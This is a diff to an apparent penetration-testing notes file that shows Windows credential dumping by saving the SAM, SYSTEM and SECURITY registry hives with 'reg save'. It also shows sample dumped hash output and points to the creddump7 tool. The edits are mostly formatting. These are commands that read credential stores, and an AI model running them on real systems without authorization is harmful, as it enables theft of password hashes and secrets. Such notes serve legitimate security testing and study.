@@ -35,16 +35,19 @@ Output:
     test:AMPLIALABS:01020304050607080900010203040506:98971234567865019812734576890102
     C:\>
 
-## via Registry
-Local SAM (sam & system), cached credentials (system & security) and LSA secrets (system & security) can be enumerated via three registry keys.
+## Registry 
+
+Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated via three registry keys:
 
 Input:
+    
     reg save HKLM\sam sam 
     reg save HKLM\system system
     reg save HKLM\security security
   
 Output:
+
     C:\>reg save HKLM\sam sam
     The operation completed successfully.
 
-These hives can be prcossed locally using creddump7 (https://github.com/Neohapsis/creddump7)
+These can be processed locally using [creddump7](https://github.com/Neohapsis/creddump7)
